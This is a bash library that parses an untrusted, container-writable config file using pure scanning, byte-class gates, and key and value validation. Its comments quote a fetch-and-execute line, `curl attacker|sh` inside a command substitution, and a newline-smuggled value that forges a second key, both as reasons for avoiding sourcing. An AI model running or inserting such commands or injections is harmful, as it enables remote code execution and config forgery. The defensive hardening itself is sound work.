#!/usr/bin/env bash
# The two config files (D2/D4): ~/.mythical/mythical.conf is host-only and never mounted;
# ~/.mythical/<product>.conf is bind-mounted read-write into that product's container.
#
# <product>.conf is UNTRUSTED INPUT (D19). It is attacker-controlled after a container compromise,
# so it is NEVER sourced, eval'd or shell-expanded. Restricting what a file may MEAN does nothing
# about what happens while READING it: `KEY=$(curl attacker|sh)` executes at source time, and an
# allowlist applied to the output cannot undo that. Everything below is a pure scanner.
#
# PURE library — no side effects at source time, and no `set -euo pipefail` (that would flip the
# sourcing shell). Every function checks statuses explicitly.

MI_CONF_MAXLEN=4096
# Whole-file ceiling for the container-writable <product>.conf. SNAP_LIMIT is one byte more, so a
# bounded read that comes back full proves the original was over the ceiling. See _mi_conf_snap.
# Not read anywhere in THIS file — the bounded-read logic that consumes them is Task 4's
# _mi_conf_snap. Declared here (not there) because the ceiling is a property of the format, not of
# one reader.
# shellcheck disable=SC2034   # unused until Task 4 wires _mi_conf_snap; see comment above
MI_CONF_MAXBYTES=1048576
# shellcheck disable=SC2034   # unused until Task 4 wires _mi_conf_snap; see comment above
MI_CONF_SNAP_LIMIT=1048577
MI_CONF_MARKER_PREFIX='#mythical-conf-sha256='

# --- byte-class gate -----------------------------------------------------------------------------
# Refuse a file containing ANY control byte other than the line separator (\n): NUL, CR, TAB,
# vertical tab, DEL, the lot.
#
# This MUST run on the FILE, before a single line reaches a shell variable. bash strings cannot hold
# a NUL byte, so a `grep`/`read`-based check physically cannot see one — the byte simply vanishes on
# its way into the variable and a value silently changes meaning between what was on disk and what
# was validated. `tr` and `cmp` operate on bytes, so they can.
#
# Deleting the class and comparing to the original is the portable test: identical ⇒ none present.
# Octal ranges are understood by both GNU and BSD tr. \012 (newline) is deliberately absent from the
# ranges below, so it survives; \011 (tab) is inside \000-\011 and is therefore refused.
_mi_conf_bytes_ok() {
  # shellcheck disable=SC2094   # both sides only READ $1; nothing in this pipeline writes it
  LC_ALL=C tr -d '\000-\011\013-\037\177' < "$1" 2>/dev/null | cmp -s - "$1"
}

# rc 0 iff the value contains only permitted characters.
# Permitted: printable ASCII (space included) and every byte >= 0x80, so a UTF-8 path such as
# /Users/José/work is accepted — refusing non-ASCII would break real operators and buys nothing,
# because the danger is control and shell metacharacters, not accents.
# Refused in addition: $ ` \ — inert here (nothing is ever expanded) but no legitimate value needs
# them, and their absence is what lets a reader stop worrying. Stated limitation: a path containing
# one of the three is unsupported.
#
# The control-character check is NOT redundant with the file-level byte gate. That gate protects the
# READ path; this function is also the WRITE path's validator, where the value arrives from a caller
# rather than from a file. A newline here is exactly D19's "a value containing a newline must not be
# able to forge a second key" — without this test, `mi_conf_family_add KEY $'a\nMYTHICAL_NET=evil'`
# would write two lines and the forgery would be complete.
#
# `local LC_ALL=C` forces [[:cntrl:]] to mean the ASCII control set rather than whatever the
# operator's locale defines (same technique lib/ledger.sh uses for byte collation). NUL needs no
# test: a bash variable cannot hold one.
_mi_conf_value_ok() {
  local v="$1"
  local LC_ALL=C
  [ "${#v}" -le "$MI_CONF_MAXLEN" ] || return 1
  # `*\\*` for the backslash, not `*'\'*`: both match a literal backslash, but shellcheck reads the
  # quoted form as a botched quote escape (SC1003) and CI fails on info-level findings.
  case "$v" in
    *[[:cntrl:]]*)    return 1 ;;   # newline, CR, TAB, ESC, … — the write-path forgery guard
    *'$'*|*'`'*|*\\*) return 1 ;;
    ' '*|*' ')        return 1 ;;   # unambiguous round-trip: no leading/trailing space
  esac
  return 0
}

# rc 0 iff the key is MYTHICAL_ followed by one or more of [A-Z0-9_].
# Written as "strip the prefix, then reject any character outside the class" because a bash `case`
# glob cannot express "every character matches" — `MYTHICAL_[A-Z0-9_]*` would accept MYTHICAL_A!.
_mi_conf_key_ok() {
  local k="$1" rest
  # Bracket ranges are LOCALE-COLLATED unless forced to byte order: in some locales [A-Z] matches
  # more than the 26 ASCII letters. LC_ALL=C makes the grammar mean exactly what it says.
  local LC_ALL=C
  [ "${#k}" -le 128 ] || return 1
  rest="${k#MYTHICAL_}"
  [ "$rest" != "$k" ] || return 1              # the prefix must actually have been present
  case "$rest" in ''|*[!A-Z0-9_]*) return 1 ;; esac
  return 0
}

# Emit KEY<TAB>VALUE for every assignment line read from STDIN. Comments (#) and blank lines are
# skipped. <label> only names the source in diagnostics. rc: 0 ok · 1 malformed (already reported).
#
# Stdin rather than a path so the caller can feed it a DERIVED stream — <product>.conf's body is the
# file minus its trailing marker line, and materialising that to a temp file would mean every READ
# wrote to ~/.mythical/, which breaks "reads never write" and fails outright on a read-only home.
#
# The split is `${line%%=*}` / `${line#*=}` — parameter expansion on the FIRST '=' only, so a value
# keeps any later '='. No eval, no expansion, no substitution: the value is inert data from the byte
# it is read to the byte it is emitted.
_mi_conf_scan_stream() {
  local label="$1" line key val n=0 seen=""
  while IFS= read -r line; do
    n=$((n + 1))
    case "$line" in
      # A marker line may appear ONLY as the file's last line, and the reader strips it before
      # scanning — so one reaching the body means either a second marker or a comment masquerading
      # as one. Both must be refused: treating it as an ordinary comment lets a file the published
      # contract rejects load here, and the writer would then silently delete that line.
      "$MI_CONF_MARKER_PREFIX"*)
        mi_warn "config: $label line $n: an integrity marker may only be the final line"; return 1 ;;
      ''|'#'*) continue ;;
      *'='*)   : ;;
      *) mi_warn "config: $label line $n: not a KEY=value assignment"; return 1 ;;
    esac
    key="${line%%=*}"
    val="${line#*=}"
    if ! _mi_conf_key_ok "$key"; then
      mi_warn "config: $label line $n: invalid key name"
      return 1
    fi
    if ! _mi_conf_value_ok "$val"; then
      mi_warn "config: $label line $n: value for $key contains a forbidden character or is too long"
      return 1
    fi
    # A duplicate key is ambiguous, and is exactly what a newline-forging write would produce.
    # Refuse rather than pick a winner. The delimiters make the match whole-key, so MYTHICAL_A
    # does not appear to collide with MYTHICAL_AB.
    case "$seen" in
      *"|${key}|"*) mi_warn "config: $label line $n: duplicate key $key"; return 1 ;;
    esac
    seen="${seen}|${key}|"
    printf '%s\t%s\n' "$key" "$val"
  done
  return 0
}

# File-level preconditions, then the stream scan.
# rc: 0 ok · 1 malformed (already reported) · 3 file missing.
mi_conf_scan() {
  if [ "$#" -ne 1 ]; then mi_warn "config: mi_conf_scan needs a <file>"; return 1; fi
  local f="$1"
  [ -f "$f" ] || return 3

  if ! _mi_conf_bytes_ok "$f"; then
    mi_warn "config: $f contains control bytes (NUL, CR, TAB or similar) — refusing to parse it"
    return 1
  fi
  # A file that does not end in a newline was truncated mid-write. Empty is fine.
  if [ -s "$f" ] && [ -n "$(tail -c1 "$f" 2>/dev/null)" ]; then
    mi_warn "config: $f does not end in a newline (truncated?) — refusing to parse it"
    return 1
  fi

  # shellcheck disable=SC2094   # "$f" here is only a LABEL for diagnostics; the redirect is the read
  _mi_conf_scan_stream "$f" < "$f"
}
